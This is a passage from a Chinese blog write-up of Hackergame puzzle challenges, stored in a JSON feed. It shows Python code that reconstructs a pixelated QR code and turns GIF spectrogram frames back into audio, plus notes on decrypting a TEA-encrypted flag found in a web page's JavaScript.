class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image</span><br><span class=\"line\"><span class=\"keyword\">import</span> math</span><br><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"><span class=\"comment\"># import scipy</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br><span class=\"line\"></span><br><span class=\"line\">SIZE = <span class=\"number\">627</span></span><br><span class=\"line\">MSBLOCK = <span class=\"number\">23</span></span><br><span class=\"line\">QRBLOCK = <span class=\"number\">11</span></span><br><span class=\"line\">X, Y = <span class=\"number\">103</span>, <span class=\"number\">137</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ImageToMatrix</span>(<span class=\"params\">filename</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 读取图片</span></span><br><span class=\"line\">    im = Image.<span class=\"built_in\">open</span>(filename)</span><br><span class=\"line\">    <span class=\"comment\"># 显示图片</span></span><br><span class=\"line\"><span class=\"comment\">#     im.show()  </span></span><br><span class=\"line\">    width,height = im.size</span><br><span class=\"line\">    im = im.convert(<span class=\"string\">&quot;L&quot;</span>) </span><br><span class=\"line\">    data = im.getdata()</span><br><span class=\"line\">    data = np.matrix(data,dtype=<span class=\"string\">&#x27;float&#x27;</span>)/<span class=\"number\">255.0</span></span><br><span class=\"line\">    new_data = np.reshape(data,(width,height))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> new_data</span><br><span class=\"line\"><span class=\"comment\">#     new_im = Image.fromarray(new_data)</span></span><br><span class=\"line\"><span class=\"comment\">#     # 显示图片</span></span><br><span class=\"line\"><span class=\"comment\">#     new_im.show()</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">MatrixToImage</span>(<span class=\"params\">data</span>):</span><br><span class=\"line\">    data = data*<span class=\"number\">255</span></span><br><span class=\"line\">    new_im = Image.fromarray(data.astype(np.uint8))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> new_im</span><br><span class=\"line\">    </span><br><span class=\"line\">pre_arr =  [[<span class=\"number\">0</span> <span class=\"keyword\">for</span> col <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(SIZE)] <span class=\"keyword\">for</span> row <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(SIZE)]</span><br><span class=\"line\">res_arr =  [[<span class=\"number\">1</span> <span class=\"keyword\">for</span> col <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(SIZE//QRBLOCK)] <span class=\"keyword\">for</span> row <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(SIZE//QRBLOCK)]</span><br><span class=\"line\">kimeta =  [[<span class=\"number\">0</span> <span class=\"keyword\">for</span> col <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(SIZE//QRBLOCK)] <span class=\"keyword\">for</span> row <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(SIZE//QRBLOCK)]<span class=\"comment\">#钦定了</span></span><br><span class=\"line\">EACH = <span class=\"built_in\">int</span>(math.ceil(MSBLOCK/QRBLOCK)) <span class=\"comment\">#EACH=3</span></span><br><span class=\"line\">filename = <span class=\"string\">&#x27;pixelated_qrcode.bmp&#x27;</span></span><br><span class=\"line\">data = ImageToMatrix(filename)</span><br><span class=\"line\">np.set_printoptions(threshold=<span class=\"number\">1145141919810</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,SIZE):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,SIZE):</span><br><span class=\"line\">            pre_arr[i][j]=data[i].tolist()[<span class=\"number\">0</span>][j]</span><br><span class=\"line\">            <span class=\"keyword\">if</span> i%QRBLOCK==<span class=\"number\">0</span> <span class=\"keyword\">and</span> j%QRBLOCK==<span class=\"number\">0</span>:</span><br><span class=\"line\">                res_arr[i//QRBLOCK][j//QRBLOCK]=<span class=\"built_in\">int</span>(data.tolist()[i][j])</span><br><span class=\"line\"><span class=\"comment\"># print(pre_arr)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span>  <span class=\"title function_\">check</span>(<span class=\"params\">i,j,now</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> i&lt;=<span class=\"number\">9</span> <span class=\"keyword\">or</span> i&gt;=<span class=\"number\">51</span> <span class=\"keyword\">or</span> j&lt;=<span class=\"number\">12</span> <span class=\"keyword\">or</span> j&gt;=<span class=\"number\">54</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> (pre_arr[i*QRBLOCK+<span class=\"number\">3</span>][j*QRBLOCK+<span class=\"number\">3</span>] == now):<span class=\"comment\">#随便写的offset</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (kimeta[i][j] <span class=\"keyword\">or</span> vis[i][j]) <span class=\"keyword\">and</span> res_arr[i][j]!=now:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getRange</span>(<span class=\"params\">i,j</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> i*QRBLOCK,j*QRBLOCK,(i+<span class=\"number\">1</span>)*QRBLOCK-<span class=\"number\">1</span>,(j+<span class=\"number\">1</span>)*QRBLOCK-<span class=\"number\">1</span> <span class=\"comment\">#x1,y1,x2,y2</span></span><br><span class=\"line\"></span><br><span class=\"line\">vis =  [[<span class=\"number\">0</span> <span class=\"keyword\">for</span> col <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(SIZE//QRBLOCK)] <span class=\"keyword\">for</span> row <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(SIZE//QRBLOCK)]</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">calcDelta</span>(<span class=\"params\">Mi,Mj,fillN,comp,LUR,LUC</span>):</span><br><span class=\"line\">    fn = fillN</span><br><span class=\"line\">    <span class=\"keyword\">for</span> xx <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(LUR,LUR+EACH) :</span><br><span class=\"line\">        <span class=\"keyword\">for</span> yy <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(LUC,LUC+EACH):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> check(xx,yy,fn&amp;<span class=\"number\">1</span>):</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"number\">114514</span></span><br><span class=\"line\">            fn = fn&gt;&gt;<span class=\"number\">1</span></span><br><span class=\"line\">    avr = <span class=\"number\">0</span></span><br><span class=\"line\">    qx1,qy1,qx2,qy2 = X+Mi*MSBLOCK,Y+Mj*MSBLOCK,X+(Mi+<span class=\"number\">1</span>)*MSBLOCK-<span class=\"number\">1</span>,Y+(Mj+<span class=\"number\">1</span>)*MSBLOCK-<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(LUR,LUR+EACH) :</span><br><span class=\"line\">        <span class=\"keyword\">for</span> y <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(LUC,LUC+EACH):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (fillN&amp;<span class=\"number\">1</span>):</span><br><span class=\"line\">                x1,y1,x2,y2 = getRange(x,y)</span><br><span class=\"line\">                inx1,iny1,inx2,iny2 = <span class=\"built_in\">max</span>(x1,qx1),<span class=\"built_in\">max</span>(y1,qy1),<span class=\"built_in\">min</span>(x2,qx2),<span class=\"built_in\">min</span>(y2,qy2)</span><br><span class=\"line\">                avr = avr + (iny2-iny1+<span class=\"number\">1</span>)*(inx2-inx1+<span class=\"number\">1</span>)</span><br><span class=\"line\">            fillN = fillN &gt;&gt; <span class=\"number\">1</span></span><br><span class=\"line\">    newres = avr/(MSBLOCK*MSBLOCK)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (newres &lt; comp-<span class=\"number\">0.1</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1919810</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">abs</span>(math.floor((avr/(MSBLOCK*MSBLOCK))*<span class=\"number\">255</span>)/<span class=\"number\">255</span>-comp)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">putRec</span>(<span class=\"params\">i,j</span>):<span class=\"comment\">#放置识别码块</span></span><br><span class=\"line\">    kimeta[i][j]=<span class=\"number\">1</span></span><br><span class=\"line\">    res_arr[i][j]=<span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">    kimeta[i][j+<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\">    res_arr[i][j+<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\">    kimeta[i][j-<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\">    res_arr[i][j-<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\">    kimeta[i+<span class=\"number\">1</span>][j]=<span class=\"number\">1</span></span><br><span class=\"line\">    res_arr[i+<span class=\"number\">1</span>][j]=<span class=\"number\">1</span></span><br><span class=\"line\">    kimeta[i-<span class=\"number\">1</span>][j]=<span class=\"number\">1</span></span><br><span class=\"line\">    res_arr[i-<span class=\"number\">1</span>][j]=<span class=\"number\">1</span></span><br><span class=\"line\">    kimeta[i+<span class=\"number\">1</span>][j+<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\">    res_arr[i+<span class=\"number\">1</span>][j+<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\">    kimeta[i-<span class=\"number\">1</span>][j-<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\">    res_arr[i-<span class=\"number\">1</span>][j-<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\">    kimeta[i+<span class=\"number\">1</span>][j-<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\">    res_arr[i+<span class=\"number\">1</span>][j-<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\">    kimeta[i-<span class=\"number\">1</span>][j+<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\">    res_arr[i-<span class=\"number\">1</span>][j+<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(i-<span class=\"number\">2</span>,i+<span class=\"number\">3</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> y <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(j-<span class=\"number\">2</span>,j+<span class=\"number\">3</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"built_in\">abs</span>(x-i)==<span class=\"number\">2</span> <span class=\"keyword\">or</span> <span class=\"built_in\">abs</span>(y-j)==<span class=\"number\">2</span>:</span><br><span class=\"line\">                kimeta[x][y]=<span class=\"number\">1</span></span><br><span class=\"line\">                res_arr[x][y]=<span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">putRec(<span class=\"number\">28</span>,<span class=\"number\">28</span>)</span><br><span class=\"line\">putRec(<span class=\"number\">28</span>,<span class=\"number\">50</span>)</span><br><span class=\"line\">putRec(<span class=\"number\">50</span>,<span class=\"number\">50</span>)</span><br><span class=\"line\">putRec(<span class=\"number\">50</span>,<span class=\"number\">28</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">9</span>,<span class=\"number\">52</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">12</span>,<span class=\"number\">55</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> i==<span class=\"number\">9</span> <span class=\"keyword\">or</span> i==<span class=\"number\">51</span> <span class=\"keyword\">or</span> j==<span class=\"number\">12</span> <span class=\"keyword\">or</span> j==<span class=\"number\">54</span>:</span><br><span class=\"line\">            kimeta[i][j]=<span class=\"number\">1</span></span><br><span class=\"line\">            res_arr[i][j]=pre_arr[i*QRBLOCK+<span class=\"number\">3</span>][j*QRBLOCK+<span class=\"number\">3</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">new_arr =  [[<span class=\"number\">1</span> <span class=\"keyword\">for</span> col <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(SIZE)] <span class=\"keyword\">for</span> row <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(SIZE)]</span><br><span class=\"line\">fked =  [[<span class=\"number\">0</span> <span class=\"keyword\">for</span> col <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">20</span>)] <span class=\"keyword\">for</span> row <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">20</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\">cntt = <span class=\"number\">0</span></span><br><span class=\"line\">savecnt=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dfs</span>(<span class=\"params\">i,j</span>):<span class=\"comment\">#从马赛克块的i行j列开始</span></span><br><span class=\"line\">    <span class=\"keyword\">global</span> cntt,savecnt</span><br><span class=\"line\">    cntt = cntt+<span class=\"number\">1</span></span><br><span class=\"line\">    LUR , LUC= (X+i*MSBLOCK)//QRBLOCK , (Y+j*MSBLOCK)//QRBLOCK</span><br><span class=\"line\">    <span class=\"comment\">#落在哪个二维码方块上</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (cntt==<span class=\"number\">200000</span>):<span class=\"comment\">#保存中途结果</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,SIZE):</span><br><span class=\"line\">            <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,SIZE):</span><br><span class=\"line\">                    new_arr[i][j]=res_arr[i//QRBLOCK][j//QRBLOCK]</span><br><span class=\"line\">        MatrixToImage(np.array(new_arr)).save(<span class=\"string\">&#x27;mid%s.bmp&#x27;</span>%savecnt)</span><br><span class=\"line\">        savecnt = savecnt + <span class=\"number\">1</span></span><br><span class=\"line\">        cntt = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> i&lt;<span class=\"number\">0</span> <span class=\"keyword\">or</span> i&gt;=<span class=\"number\">20</span> <span class=\"keyword\">or</span> j&lt;<span class=\"number\">0</span> <span class=\"keyword\">or</span> j&gt;=<span class=\"number\">20</span> <span class=\"keyword\">or</span> fked[i][j]:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">    fked[i][j]=<span class=\"number\">1</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    nowMin , nowSol = <span class=\"number\">114514191981.0</span> , (<span class=\"number\">1</span>&lt;&lt;(EACH*EACH))-<span class=\"number\">1</span></span><br><span class=\"line\">    tmpp =  [[<span class=\"number\">0</span> <span class=\"keyword\">for</span> col <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>)] <span class=\"keyword\">for</span> row <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>)]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(LUR,LUR+EACH) :</span><br><span class=\"line\">        <span class=\"keyword\">for</span> y <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(LUC,LUC+EACH):</span><br><span class=\"line\">            tmpp[x-LUR][y-LUC]=vis[x][y]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> filN <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">1</span>&lt;&lt;(EACH*EACH)):<span class=\"comment\">#枚举每个马赛克块影响到的3*3=9个QR块</span></span><br><span class=\"line\">        tmp = calcDelta(i, j, filN, pre_arr[X+i*MSBLOCK+<span class=\"number\">2</span>][Y+j*MSBLOCK+<span class=\"number\">2</span>],LUR,LUC)<span class=\"comment\">#同样是乱写的offset+2</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> tmp &lt; <span class=\"number\">0.00000001</span>:</span><br><span class=\"line\">            nowSol = filN</span><br><span class=\"line\">            <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(LUR,LUR+EACH) :</span><br><span class=\"line\">                <span class=\"keyword\">for</span> y <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(LUC,LUC+EACH):</span><br><span class=\"line\">                    vis[x][y] = <span class=\"number\">1</span></span><br><span class=\"line\">                    res_arr[x][y]=nowSol&amp;<span class=\"number\">1</span></span><br><span class=\"line\">                    nowSol = nowSol&gt;&gt;<span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> ((i+<span class=\"number\">1</span>&lt;<span class=\"number\">20</span> <span class=\"keyword\">and</span> (<span class=\"keyword\">not</span> fked[i+<span class=\"number\">1</span>][j]) <span class=\"keyword\">and</span> dfs(i+<span class=\"number\">1</span>,j)) <span class=\"keyword\">or</span> (j+<span class=\"number\">1</span>&lt;<span class=\"number\">20</span> <span class=\"keyword\">and</span> (<span class=\"keyword\">not</span> fked[i][j+<span class=\"number\">1</span>]) <span class=\"keyword\">and</span> dfs(i,j+<span class=\"number\">1</span>)) <span class=\"keyword\">or</span> (i-<span class=\"number\">1</span>&gt;=<span class=\"number\">0</span> <span class=\"keyword\">and</span> (<span class=\"keyword\">not</span> fked[i-<span class=\"number\">1</span>][j]) <span class=\"keyword\">and</span> dfs(i-<span class=\"number\">1</span>,j)) <span class=\"keyword\">or</span> (j-<span class=\"number\">1</span>&gt;=<span class=\"number\">0</span> <span class=\"keyword\">and</span> (<span class=\"keyword\">not</span> fked[i][j-<span class=\"number\">1</span>]) <span class=\"keyword\">and</span> dfs(i,j-<span class=\"number\">1</span>))):</span><br><span class=\"line\">                fked[i][j]=<span class=\"number\">0</span></span><br><span class=\"line\">                <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(LUR,LUR+EACH) :</span><br><span class=\"line\">                    <span class=\"keyword\">for</span> y <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(LUC,LUC+EACH):</span><br><span class=\"line\">                        vis[x][y] = tmpp[x-LUR][y-LUC]</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">            </span><br><span class=\"line\">    fked[i][j]=<span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(LUR,LUR+EACH) :</span><br><span class=\"line\">        <span class=\"keyword\">for</span> y <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(LUC,LUC+EACH):</span><br><span class=\"line\">            vis[x][y] = tmpp[x-LUR][y-LUC]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#预先扫描，把能确定的、没有多解的先填上</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">20</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">20</span>):</span><br><span class=\"line\">        LUR , LUC= (X+i*MSBLOCK)//QRBLOCK , (Y+j*MSBLOCK)//QRBLOCK</span><br><span class=\"line\">        succnt = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> filN <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">1</span>&lt;&lt;(EACH*EACH)):</span><br><span class=\"line\">                tmp = calcDelta(i, j, filN, pre_arr[X+i*MSBLOCK+<span class=\"number\">2</span>][Y+j*MSBLOCK+<span class=\"number\">2</span>],LUR,LUC)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> tmp &lt; <span class=\"number\">0.00000001</span>:</span><br><span class=\"line\">                    succnt = succnt + <span class=\"number\">1</span></span><br><span class=\"line\">                    nowSol = filN</span><br><span class=\"line\">        <span class=\"keyword\">if</span> succnt == <span class=\"number\">1</span>:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(LUR,LUR+EACH) :</span><br><span class=\"line\">                <span class=\"keyword\">for</span> y <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(LUC,LUC+EACH):</span><br><span class=\"line\">                    kimeta[x][y] = <span class=\"number\">1</span></span><br><span class=\"line\">                    res_arr[x][y]=nowSol&amp;<span class=\"number\">1</span></span><br><span class=\"line\">                    nowSol = nowSol&gt;&gt;<span class=\"number\">1</span></span><br><span class=\"line\">dfs(<span class=\"number\">5</span>,<span class=\"number\">5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,SIZE):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,SIZE):</span><br><span class=\"line\">        new_arr[i][j]=res_arr[i//QRBLOCK][j//QRBLOCK]</span><br><span class=\"line\">MatrixToImage(np.array(new_arr)).save(<span class=\"string\">&#x27;resu.bmp&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<p>最终效果：<img src=\"https://img2020.cnblogs.com/blog/1335480/202110/1335480-20211030160204036-1937509495.jpg\" alt=\"QRCode\" loading=\"lazy\"></p>\n<hr>\n<h2 id=\"minecRaft\"><a href=\"#minecRaft\" class=\"headerlink\" title=\"minecRaft\"></a>minecRaft</h2><p>web× reverse√<br>打开网页查看js，找到flag.js，在<a href=\"http://jsnice.org/\">jsnice.org</a>反混淆后自己手动再替换下几个迷人眼的常量，之后进行代码审计，会发现这是个TEA加密。如何发现是TEA呢？我搜了好久，后来有人告诉我只需要搜常量就行（还需要学习一个人生经验）。<br>我们需要找到一个字符串s，使得s.encrypt(“{那串数字密钥}”)&#x3D;&#x3D;&#x3D; “6f……0c”<br>把密文切片避免转换后数字过大，在题目页面下<code>F12</code>，进入Console里执行：</p>\n<pre><code class=\"javascript\">window.btoa(LongToStr4(Base16ToLong(&#39;6fbde674&#39;))+LongToStr4(Base16ToLong(&#39;819a59bf&#39;))+LongToStr4(Base16ToLong(&#39;a1209256&#39;))+LongToStr4(Base16ToLong(&#39;5b4ca2a7&#39;))+LongToStr4(Base16ToLong(&#39;a11dc670&#39;))+LongToStr4(Base16ToLong(&#39;c678681d&#39;))+LongToStr4(Base16ToLong(&#39;af4afb67&#39;))+LongToStr4(Base16ToLong(&#39;04b82f0c&#39;)))\n</code></pre>\n<p>得到密文dOa9b79ZmoFWkiChp6JMW3DGHaEdaHjGZ&#x2F;tKrwwvuAQ&#x3D;<br>谷歌<code>TEA decryption online</code>，进入<a href=\"https://www.mefancy.com/obfuscation/encryption-generator.php\">https://www.mefancy.com/obfuscation/encryption-generator.php</a>把上面那串数字密钥（13…）还有密文丢进去就出flag了。</p>\n<hr>\n<h2 id=\"p😭q\"><a href=\"#p😭q\" class=\"headerlink\" title=\"p😭q\"></a>p😭q</h2><p>老外大奥流泪.gif  早知道，还是原道.jpg<br>先把gif的帧提取出来方便处理：</p>\n<pre><code class=\"python\">import os\nimport sys\nfrom PIL import Image\n\ndef extractFrames(inGif, outFolder):\n    frame = Image.open(inGif)\n    nframes = 0\n    while frame:\n        frame.save(&#39;./dest/%s.png&#39; % (nframes))\n        nframes += 1\n        try:\n            frame.seek(nframes)\n        except EOFError:\n            break;\n    return True\n\nif __name__ == &#39;__main__&#39;:\n    image = os.path.abspath(sys.argv[1])\n    dest = os.path.join(os.path.dirname(image), &quot;dest&quot;)\n    if not os.path.exists(dest):\n        os.mkdir(dest)\n    extractFrames(image, dest)\n</code></pre>\n<p>然后原题给啥库就用啥库，逆回去：</p>\n<pre><code class=\"python\">from array2gif import write_gif  # version: 1.0.4\nimport librosa  # version: 0.8.1\nimport numpy as np  # version: 1.19.5\nimport soundfile as sf\nfrom PIL import Image\nimport matplotlib.pyplot as plt\n\ndef ImageToMatrix(filename):\n    im = Image.open(filename)\n    height,width = im.size\n    im = im.convert(&#39;L&#39;)\n    data = im.getdata()\n    data = np.matrix(data,dtype=&#39;float&#39;)/255.0\n    new_data = np.reshape(data,(width,height))\n    return new_data\nnp.set_printoptions(threshold=1145141919810)\nnum_freqs = 32\nquantize = 2\nmin_db = -60\nmax_db = 30\nfft_window_size = 2048\nframe_step_size = 512\nwindow_function_type = &#39;hann&#39;\nred_pixel = [255, 0, 0]\nwhite_pixel = [255, 255, 255]\nsample_rate = 22050\nlis =  [[0.0 for col in range(587)] for row in range(32)]\nimgg = [[0.0 for col in range(130)] for row in range(92)]\nfor ii in range (0,587):\n    filename = &#39;./dest/%s.png&#39;%ii\n    print(filename)\n    data = ImageToMatrix(filename)\n    for i in range(0,92):\n        for j in range(0,130):\n            imgg[i][j]=data.tolist()[i][j]\n    for xpos in range(0,32):\n        for scan in range(0,92):\n            if imgg[scan][xpos*4+2]&lt;1.0:  \n                lis[xpos][ii]=float((91-scan)-60)\n                break\n\nspectrogram =  np.array(lis)\naudio_signal = librosa.feature.inverse.mel_to_audio(librosa.db_to_power(spectrogram), sr=sample_rate, n_fft=fft_window_size*2, hop_length=frame_step_size, window=window_function_type)\nsf.write(&#39;newnew.wav&#39;, audio_signal, sample_rate) \n</code></pre>\n<p>最后在Adobe Audition CC里随便处理处理，勉强能听了，开始努力听写：<br><code>Theflagis f,l,a,g ......</code>  </p>\n",
            "tags": [
                "Write-Up",
                "Hackergame"
            ]
        }
    ]
}